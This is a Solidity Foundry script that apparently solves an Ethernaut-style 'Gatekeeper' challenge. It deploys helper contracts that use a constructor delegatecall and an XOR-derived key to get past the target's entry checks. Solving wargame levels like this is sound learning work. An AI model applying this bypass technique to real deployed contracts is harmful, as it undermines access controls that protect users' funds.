// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    address constant INSTANCE = 0x4792C1b2b032D336AC34b143C80799acAA0341e1;

    function run() external {
        vm.startBroadcast();
        new Exploiter2(address(new Exploiter(INSTANCE)));
        vm.stopBroadcast();
    }
}

contract Exploiter2 {
    constructor(address _exploiter) {
        (bool success, bytes memory data) = _exploiter.delegatecall(
            abi.encodeWithSignature("enter()")
        );
    }
}

contract Exploiter {
    address immutable GATE;

    constructor(address _gate) {
        GATE = _gate;
    }

    function enter() external {
        bytes8 key = _getKey();
        bool success;
        IGatekeeper(GATE).enter(key);
    }

    function _getKey() internal returns(bytes8 key) {
        // uint160 _mask = uint160(address(1)) << 63; 
        // uint160 _last16 = uint160(uint16(uint160(msg.sender)));
        // key = bytes8(uint64(_mask + _last16));
        uint64 _hash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        key = bytes8(_hash ^ type(uint64).max);
    }
}

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}